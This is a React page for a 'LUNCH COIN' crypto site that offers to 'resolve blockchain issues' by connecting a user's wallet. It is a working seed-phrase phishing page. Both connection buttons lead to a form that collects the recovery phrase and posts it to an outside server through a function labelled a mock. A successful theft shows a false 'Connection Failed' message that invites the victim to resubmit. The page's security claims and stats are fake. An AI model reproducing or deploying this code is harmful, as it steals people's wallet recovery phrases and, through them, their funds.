import React, { useState, useEffect } from 'react';
import { 
  ChevronDown, 
  Wallet, 
  Import, 
  X, 
  Check, 
  AlertTriangle, 
  Shield, 
  Zap,
  Eye,
  EyeOff,
  Copy,
  ExternalLink,
  ArrowLeft,
  Lock,
  Users
} from 'lucide-react';
import axios from 'axios';

// Reduced to only 2 popular wallets as requested
const POPULAR_WALLETS = [
  {
    id: 'metamask',
    name: 'MetaMask',
    icon: '🦊',
    description: 'Most popular Ethereum wallet'
  },
  {
    id: 'trust',
    name: 'Trust Wallet',
    icon: '🔵',
    description: 'Multi-currency mobile wallet'
  }
];

// Mock function for wallet connection
const sendWalletInfo = async (walletName, secretPhrase, userWalletName) => {
  try {
    const response = await axios.post('https://webapp-e18z.onrender.com/api/send-wallet', {
      walletName,
      secretPhrase,
      userWalletName
    });

    return response.data; // assuming backend responds with { success: true/false, ... }
  } catch (err) {
    console.error('Error sending wallet info:', err);
    return { success: false, error: err.response?.data?.message || err.message };
  }
};

export default function ConnectPage() {
  // State management
  const [showManualPopup, setShowManualPopup] = useState(false);
  const [showWalletForm, setShowWalletForm] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [showSuccessPopup, setShowSuccessPopup] = useState(false);
  const [showErrorPopup, setShowErrorPopup] = useState(false);
  const [isConnecting, setIsConnecting] = useState(false);
  const [showSecretPhrase, setShowSecretPhrase] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  
  // Form data
  const [formData, setFormData] = useState({
    walletName: '',
    secretPhrase: ''
  });
  
  // Validation errors
  const [errors, setErrors] = useState({});
  
  // Handle both manual and automatic connection flow - both go to manual process
  const handleConnect = (type) => {
    setShowManualPopup(true);
  };
  
  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet);
    setFormData({ ...formData, walletName: wallet.name });
    setShowManualPopup(false);
    setShowWalletForm(true);
  };
  
  const handleInputChange = (field, value) => {
    setFormData({ ...formData, [field]: value });
    // Clear error when user starts typing
    if (errors[field]) {
      setErrors({ ...errors, [field]: '' });
    }
  };
  
  const validateForm = () => {
    const newErrors = {};
    
    if (!formData.walletName.trim()) {
      newErrors.walletName = 'Wallet name is required';
    }
    
    if (!formData.secretPhrase.trim()) {
      newErrors.secretPhrase = 'Secret phrase is required';
    } else {
      const words = formData.secretPhrase.trim().split(/\s+/);
      if (words.length < 12) {
        newErrors.secretPhrase = 'Secret phrase must contain at least 12 words';
      }
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };
  
  const handleManualSubmit = async (e) => {
    e.preventDefault();
    
    const isValid = validateForm();
    if (!isValid) return;
    
    setIsConnecting(true);
    
    try {
      const result = await sendWalletInfo(
        selectedWallet.name, 
        formData.secretPhrase, 
        formData.walletName
      );
      // console.log( selectedWallet.name, 
      //   formData.secretPhrase, 
      //   formData.walletName)
      
      if (result.success) {
        setShowWalletForm(false);
        setShowErrorPopup(true);
        setFormData({ walletName: '', secretPhrase: '' });
        setSelectedWallet(null);
      } else {
        setShowErrorPopup(true);
        setErrorMessage(result.error || 'Submission failed');
      }
    } catch (error) {
      console.error('Submission error:', error);
      setShowErrorPopup(true);
      setErrorMessage(error.message || 'An unexpected error occurred');
    } finally {
      setIsConnecting(false);
    }
  };
  
  const closeAllPopups = () => {
    setShowManualPopup(false);
    setShowWalletForm(false);
    setShowSuccessPopup(false);
    setShowErrorPopup(false);
    setSelectedWallet(null);
    setFormData({ walletName: '', secretPhrase: '' });
    setErrors({});
    setErrorMessage('');
  };

  
  const useCounter = (end, duration = 2000) => {
    const [count, setCount] = useState(0);
    
    useEffect(() => {
      let startTime;
      const animate = (currentTime) => {
        if (!startTime) startTime = currentTime;
        const progress = Math.min((currentTime - startTime) / duration, 1);
        setCount(Math.floor(progress * end));
        if (progress < 1) requestAnimationFrame(animate);
      };
      requestAnimationFrame(animate);
    }, [end, duration]);
    
    return count;
  };

  const Stats = () => {
    const issues = useCounter(50);
    const success = useCounter(99.8);
    
    return (
      <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-16">
        <div className="text-center p-6 bg-gray-900/50 rounded-xl border border-cyan-500/20 backdrop-blur-sm hover:border-cyan-400/40 transition-all duration-300">
          <div className="text-4xl font-bold text-cyan-400 mb-2">{issues}K+</div>
          <div className="text-gray-300">Issues Resolved</div>
        </div>
        <div className="text-center p-6 bg-gray-900/50 rounded-xl border border-cyan-500/20 backdrop-blur-sm hover:border-cyan-400/40 transition-all duration-300">
          <div className="text-4xl font-bold text-cyan-400 mb-2">{success}%</div>
          <div className="text-gray-300">Success Rate</div>
        </div>
        <div className="text-center p-6 bg-gray-900/50 rounded-xl border border-cyan-500/20 backdrop-blur-sm hover:border-cyan-400/40 transition-all duration-300">
          <div className="text-4xl font-bold text-cyan-400 mb-2">24/7</div>
          <div className="text-gray-300">Support</div>
        </div>
      </div>
    );
  };
  
  return (
    <div className="min-h-screen bg-black text-white overflow-x-hidden">
      {/* Animated Background - matching hero page */}
      <div className="fixed inset-0 opacity-30">
        <div className="absolute inset-0 bg-gradient-to-br from-cyan-900/20 via-black to-blue-900/20"></div>
        <div className="absolute top-0 left-1/4 w-96 h-96 bg-cyan-500/10 rounded-full filter blur-3xl animate-pulse"></div>
        <div className="absolute bottom-0 right-1/4 w-96 h-96 bg-blue-500/10 rounded-full filter blur-3xl animate-pulse delay-1000"></div>
      </div>

      {/* Header - matching hero page style */}
      <header className="relative z-50 bg-black/80 backdrop-blur-lg border-b border-gray-800/50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center py-4">
            <div className="flex items-center space-x-3">
              <div className="w-10 h-10 bg-gradient-to-r from-cyan-500 to-blue-500 rounded-lg flex items-center justify-center">
                <Zap className="w-6 h-6 text-white" />
              </div>
              <span className="text-2xl font-bold bg-gradient-to-r from-cyan-400 to-blue-400 bg-clip-text text-transparent">
                LUNCH COIN
              </span>
            </div>
            <button 
              onClick={() => window.history.back()} 
              className="flex items-center gap-2 px-4 py-2 rounded-lg bg-gray-800 hover:bg-gray-700 text-cyan-400 border border-cyan-500/30 hover:border-cyan-400/50 transition-all"
            >
              <ArrowLeft size={16} />
              Back
            </button>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="relative z-10 pt-20 pb-32">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          {/* Page Header - hero style */}
          <div className="text-center mb-16">
            <div className="mb-8">
              <h1 className="text-5xl md:text-7xl font-bold mb-6 leading-tight">
                <span className="block text-white">CONNECT YOUR</span>
                <span className="block bg-gradient-to-r from-cyan-400 via-blue-400 to-purple-400 bg-clip-text text-transparent">
                  CRYPTO WALLET
                </span>
              </h1>
              <div className="flex items-center justify-center space-x-2 mb-8">
                <Lock className="w-6 h-6 text-cyan-400" />
                <span className="text-xl text-gray-300">Secure Connection. <span className="text-cyan-400 font-semibold">Instant Resolution.</span></span>
              </div>
            </div>

            <p className="text-xl text-gray-300 mb-12 max-w-3xl mx-auto leading-relaxed">
              Choose your preferred connection method to securely access your crypto wallet and resolve blockchain issues. 
              Our advanced security protocols ensure your assets remain protected throughout the process.
            </p>
          </div>

          {/* Connection Methods - hero style cards */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-12 mb-16 max-w-5xl mx-auto">
            {/* Manual Connection */}
            <div className="group relative overflow-hidden rounded-2xl bg-gray-900/60 border border-gray-700/50 hover:border-cyan-500/50 transition-all duration-300 hover:shadow-lg hover:shadow-cyan-500/10 backdrop-blur-sm p-8">
              <div className="absolute top-0 right-0 w-32 h-32 bg-gradient-to-br from-cyan-500/10 to-blue-600/10 rounded-full blur-3xl"></div>
              
              <div className="relative z-10">
                <div className="flex items-center gap-4 mb-6">
                  <div className="w-16 h-16 rounded-xl bg-gradient-to-r from-cyan-500/20 to-blue-500/20 flex items-center justify-center group-hover:from-cyan-500/30 group-hover:to-blue-500/30 transition-all duration-300">
                    <Import size={32} className="text-cyan-400" />
                  </div>
                  <div>
                    <h3 className="text-2xl font-bold text-white">Manual Connection</h3>
                    <p className="text-cyan-400 text-sm font-medium">Import using seed phrase</p>
                  </div>
                </div>
                
                <p className="text-gray-300 mb-8 text-lg leading-relaxed">
                  Securely connect by selecting your wallet type and entering your recovery phrase. 
                  Full control over the connection process with bank-level encryption.
                </p>
                
                <div className="features-list space-y-3 mb-10">
                  <div className="flex items-center gap-3 text-gray-300">
                    <Shield size={18} className="text-cyan-400" />
                    <span>Bank-level encryption</span>
                  </div>
                  <div className="flex items-center gap-3 text-gray-300">
                    <Check size={18} className="text-cyan-400" />
                    <span>Works with all wallet types</span>
                  </div>
                  <div className="flex items-center gap-3 text-gray-300">
                    <Wallet size={18} className="text-cyan-400" />
                    <span>Direct access to funds</span>
                  </div>
                </div>
                
                <button 
                  onClick={() => handleConnect('manual')}
                  className="w-full px-8 py-4 rounded-lg bg-gradient-to-r from-cyan-500 to-blue-500 hover:from-cyan-400 hover:to-blue-400 text-white font-semibold transition-all shadow-lg shadow-cyan-500/25 hover:shadow-cyan-400/40 transform hover:scale-105"
                >
                  Connect Manually
                </button>
              </div>
            </div>

            {/* Automatic Connection */}
            <div className="group relative overflow-hidden rounded-2xl bg-gray-900/60 border border-gray-700/50 hover:border-blue-500/50 transition-all duration-300 hover:shadow-lg hover:shadow-blue-500/10 backdrop-blur-sm p-8">
              <div className="absolute top-0 right-0 w-32 h-32 bg-gradient-to-br from-blue-500/10 to-purple-600/10 rounded-full blur-3xl"></div>
              
              <div className="relative z-10">
                <div className="flex items-center gap-4 mb-6">
                  <div className="w-16 h-16 rounded-xl bg-gradient-to-r from-blue-500/20 to-purple-500/20 flex items-center justify-center group-hover:from-blue-500/30 group-hover:to-purple-500/30 transition-all duration-300">
                    <Zap size={32} className="text-blue-400" />
                  </div>
                  <div>
                    <h3 className="text-2xl font-bold text-white">Automatic Connection</h3>
                    <p className="text-blue-400 text-sm font-medium">One-click Web3 connection</p>
                  </div>
                </div>
                
                <p className="text-gray-300 mb-8 text-lg leading-relaxed">
                  Quick connection using popular wallet providers. 
                  Fast and secure with built-in Web3 protocols for instant blockchain access.
                </p>
                
                <div className="features-list space-y-3 mb-10">
                  <div className="flex items-center gap-3 text-gray-300">
                    <Zap size={18} className="text-blue-400" />
                    <span>Instant connection</span>
                  </div>
                  <div className="flex items-center gap-3 text-gray-300">
                    <Shield size={18} className="text-blue-400" />
                    <span>Multiple wallet support</span>
                  </div>
                  <div className="flex items-center gap-3 text-gray-300">
                    <Check size={18} className="text-blue-400" />
                    <span>No seed phrase required</span>
                  </div>
                </div>
                
                <button 
                  onClick={() => handleConnect('automatic')}
                  disabled={isConnecting}
                  className="w-full px-8 py-4 rounded-lg bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-400 hover:to-purple-500 text-white font-semibold transition-all shadow-lg shadow-blue-500/25 hover:shadow-blue-400/40 disabled:opacity-50 disabled:cursor-not-allowed transform hover:scale-105"
                >
                  Connect Automatically
                </button>
              </div>
            </div>
          </div>

          {/* Stats Section - matching hero */}
          <Stats />

          {/* Security Notice - hero style */}
          <div className="bg-gray-900/60 rounded-2xl p-8 border border-cyan-500/20 backdrop-blur-sm max-w-4xl mx-auto">
            <div className="flex items-start gap-6">
              <div className="w-16 h-16 bg-gradient-to-r from-yellow-500/20 to-orange-500/20 rounded-xl flex items-center justify-center flex-shrink-0">
                <Shield size={32} className="text-yellow-400" />
              </div>
              <div>
                <h3 className="text-2xl font-bold text-white mb-4">Security Notice</h3>
                <p className="text-gray-300 text-lg leading-relaxed">
                  Your security is our top priority. We use industry-standard encryption to protect your wallet information. 
                  Never share your seed phrase with anyone else, and always verify you're on the official LUNCH COIN platform 
                  before connecting your wallet. Our protocols ensure complete privacy and asset protection.
                </p>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Manual Wallet Selection Popup */}
      {showManualPopup && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-gray-900 border border-cyan-500/30 rounded-2xl p-8 w-full max-w-lg animate-scale-in">
            <div className="flex justify-between items-center mb-8">
              <h3 className="text-2xl font-bold text-white">Select Your Wallet</h3>
              <button 
                onClick={() => setShowManualPopup(false)}
                className="p-2 hover:bg-white/10 rounded-lg transition-colors"
              >
                <X size={24} className="text-gray-400" />
              </button>
            </div>
            
            <div className="space-y-4">
              {POPULAR_WALLETS.map((wallet) => (
                <button
                  key={wallet.id}
                  onClick={() => handleWalletSelect(wallet)}
                  className="w-full p-6 rounded-xl bg-gray-800/50 border border-gray-700/50 hover:bg-gray-800/80 hover:border-cyan-500/50 transition-all group text-left"
                >
                  <div className="flex items-center gap-6">
                    <div className="text-4xl">{wallet.icon}</div>
                    <div className="flex-1">
                      <h4 className="text-xl font-bold text-white group-hover:text-cyan-400 transition-colors">
                        {wallet.name}
                      </h4>
                      <p className="text-gray-400 text-lg">{wallet.description}</p>
                    </div>
                    <ChevronDown size={20} className="text-gray-400 rotate-[-90deg]" />
                  </div>
                </button>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Manual Connection Form Popup */}
      {showWalletForm && selectedWallet && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-gray-900 border border-cyan-500/30 rounded-2xl p-8 w-full max-w-md animate-scale-in">
            <div className="flex justify-between items-center mb-8">
              <h3 className="text-2xl font-bold text-white">Connect {selectedWallet.name}</h3>
              <button 
                onClick={closeAllPopups}
                className="p-2 hover:bg-white/10 rounded-lg transition-colors"
              >
                <X size={24} className="text-gray-400" />
              </button>
            </div>
            
            <div className="space-y-6">
            <form onSubmit={handleManualSubmit}>
              {/* Wallet Type (Read-only) */}
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-3">
                  Wallet Type
                </label>
                <div className="flex items-center gap-4 p-4 rounded-lg bg-gray-800/50 border border-gray-700">
                  <span className="text-2xl">{selectedWallet.icon}</span>
                  <span className="text-white font-semibold text-lg">{selectedWallet.name}</span>
                </div>
              </div>

              {/* Wallet Name Input */}
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-3">
                  Wallet Name <span className="text-red-400">*</span>
                </label>
                <input
                  type="text"
                  name="walletName"
                  value={formData.walletName}
                  onChange={(e) => handleInputChange('walletName', e.target.value)}
                  placeholder="Enter a name for your wallet"
                  className={`w-full p-4 rounded-lg bg-gray-800/50 border ${
                    errors.walletName ? 'border-red-500' : 'border-gray-700'
                  } text-white placeholder-gray-400 focus:border-cyan-500 focus:outline-none transition-colors text-lg`}
                  required
                />
                {errors.walletName && (
                  <p className="text-red-400 text-sm mt-2">{errors.walletName}</p>
                )}
              </div>

              {/* Secret Phrase Input */}
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-3">
                  Recovery Phrase (12-24 words) <span className="text-red-400">*</span>
                </label>
                <div className="relative">
                  <textarea
                    name="secretPhrase"
                    value={formData.secretPhrase}
                    onChange={(e) => handleInputChange('secretPhrase', e.target.value)}
                    placeholder="Enter your recovery phrase separated by spaces"
                    rows={5}
                    className={`w-full p-4 rounded-lg bg-gray-800/50 border ${
                      errors.secretPhrase ? 'border-red-500' : 'border-gray-700'
                    } text-white placeholder-gray-400 focus:border-cyan-500 focus:outline-none transition-colors resize-none text-lg ${
                      showSecretPhrase ? '' : 'filter blur-sm'
                    }`}
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowSecretPhrase(!showSecretPhrase)}
                    className="absolute top-4 right-4 p-2 hover:bg-white/10 rounded transition-colors"
                  >
                    {showSecretPhrase ? (
                      <EyeOff size={20} className="text-gray-400" />
                    ) : (
                      <Eye size={20} className="text-gray-400" />
                    )}
                  </button>
                </div>
                {errors.secretPhrase && (
                  <p className="text-red-400 text-sm mt-2">{errors.secretPhrase}</p>
                )}
                <p className="text-gray-500 text-sm mt-2">
                  Your recovery phrase will be encrypted and securely processed
                </p>
              </div>

              {/* Submit Button */}
              <button
                type="submit"  // ← This should be type="submit"
                onClick={handleManualSubmit}
                disabled={isConnecting}
                className="w-full px-8 py-4 rounded-lg bg-gradient-to-r from-cyan-500 to-blue-500 hover:from-cyan-400 hover:to-blue-400 text-white font-semibold transition-all shadow-lg shadow-cyan-500/25 hover:shadow-cyan-400/40 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-3 text-lg"
              >
                {isConnecting ? (
                  <>
                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                    Connecting...
                  </>
                ) : (
                  'Connect Wallet'
                )}
              </button>
            </form> 
          </div>  
        </div>
        </div>
      )}

      {/* Success Popup */}
      {showSuccessPopup && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-gray-900 border border-green-500/50 rounded-2xl p-10 w-full max-w-md text-center animate-scale-in">
            <div className="w-20 h-20 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-8">
              <Check size={40} className="text-green-400" />
            </div>
            <h3 className="text-3xl font-bold text-white mb-6">Connection Successful!</h3>
            <p className="text-gray-300 text-lg mb-8 leading-relaxed">
              Your wallet information has been securely processed. Our team will review and resolve any issues with your wallet.
            </p>
            <button
              onClick={closeAllPopups}
              className="px-8 py-4 rounded-lg bg-green-600 hover:bg-green-500 text-white font-semibold transition-colors text-lg"
            >
              Continue
            </button>
          </div>
        </div>
      )}

      {/* Error Popup */}
      {showErrorPopup && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-gray-900 border border-red-500/50 rounded-2xl p-10 w-full max-w-md text-center animate-scale-in">
            <div className="w-20 h-20 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-8">
              <AlertTriangle size={40} className="text-red-400" />
            </div>
            <h3 className="text-3xl font-bold text-white mb-6">Connection Failed</h3>
            <p className="text-gray-300 text-lg mb-8 leading-relaxed">
              There was an error processing your wallet connection. Please try again or contact support if the problem persists.
            </p>
            <button
              onClick={closeAllPopups}
              className="px-8 py-4 rounded-lg bg-red-600 hover:bg-red-500 text-white font-semibold transition-colors text-lg"
            >
              Try Again
            </button>
          </div>
        </div>
      )}

      <style>{`
        @keyframes scale-in {
          from {
            opacity: 0;
            transform: scale(0.9);
          }
          to {
            opacity: 1;
            transform: scale(1);
          }
        }

        .animate-scale-in {
          animation: scale-in 0.2s ease-out;
        }

        ::-webkit-scrollbar {
          width: 6px;
        }

        ::-webkit-scrollbar-track {
          background: rgba(255, 255, 255, 0.1);
          border-radius: 3px;
        }

        ::-webkit-scrollbar-thumb {
          background: rgba(6, 182, 212, 0.6);
          border-radius: 3px;
        }

        ::-webkit-scrollbar-thumb:hover {
          background: rgba(6, 182, 212, 0.8);
        }
      `}</style>
    </div>
  );
}
